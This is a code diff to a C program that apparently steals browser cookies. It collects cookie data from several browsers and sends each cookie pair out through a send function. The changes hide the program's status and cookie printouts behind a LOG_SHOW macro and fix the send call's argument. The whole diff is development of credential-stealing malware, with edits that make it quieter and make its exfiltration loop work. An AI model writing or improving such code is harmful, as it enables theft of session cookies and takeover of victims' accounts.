@@ -13,7 +13,6 @@
 #include <dirent.h>
 #include <sqlite3.h>
 #include <windows.h>
-#include <curl/curl.h>
 
 #ifndef CH_TYPE
 #define CH_TYPE 1
@@ -23,6 +22,8 @@
 
 #endif
 #endif
+
+#define LOG_SHOW
 
 
 /* Global cookies array and it's offset for callback.
@@ -62,16 +63,20 @@ int main(void)
     local_machine.user_path = (char *)malloc(sizeof(user_path) + 1);
     strcpy(local_machine.user_path, user_path);
 
+
+    #ifndef LOG_SHOW
     /* Output status for test pourpose. */
     printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
         local_machine.FF, local_machine.CH,
         local_machine.OP, local_machine.YA);
 
+    #endif
 
     /* Here we go. */
     local_container = calloc(1, sizeof(cookies_datatype));
     collect_data(local_machine);
 
+    #ifndef LOG_SHOW
     /* Just in case. */
     for (int i = 0; i < offset; i++)
     {
@@ -81,11 +86,13 @@ int main(void)
             local_container[i].value);
     }
 
+    #endif
+
     /* Execute send function for every cookie pair. */
     uint8_t status;
     for (int i = 0; i < offset; i++)
     {
-        status = send_single_cookie(local_container[i]);
+        status = send_single_cookie(&local_container[i]);
         if (!status)
             break;
     }
